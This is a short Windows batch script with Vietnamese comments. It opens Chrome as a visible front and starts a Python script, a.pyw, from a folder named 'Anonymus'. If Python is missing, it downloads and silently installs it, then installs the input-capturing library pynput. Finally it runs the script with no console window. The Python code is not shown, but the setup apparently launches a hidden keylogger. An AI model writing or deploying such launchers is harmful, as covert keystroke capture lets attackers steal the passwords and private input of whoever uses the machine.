start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
D:
cd Anonymus
start "" "D:\Anonymus\a.pyw"
@echo off

:: Kiểm tra xem Python đã được cài đặt chưa
where python >nul 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo Python is not installed. Installing Python...
    :: Tải và cài đặt Python
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe' -OutFile 'python_installer.exe'"
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
)

:: Cài đặt các thư viện cần thiết
python -m pip install --upgrade pip
python -m pip install pynput

:: Chạy ứng dụng Python
pythonw a.pyw
